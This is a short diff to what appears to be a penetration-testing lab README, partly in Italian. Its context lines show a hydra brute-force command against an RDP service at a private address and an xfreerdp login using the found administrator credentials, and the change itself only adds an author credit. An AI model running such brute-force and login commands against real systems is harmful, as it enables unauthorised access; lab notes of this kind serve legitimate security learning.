@@ -68,5 +68,6 @@ For the exploitation part of these protocols with Metasploit framework, i direct
  - hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333 (esegue un brute force su rdp)
  - xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333  (esegue la connessione con le credenziali)
 
-
+#Author
+<b>Xiao Li Savio Feng</b>
 
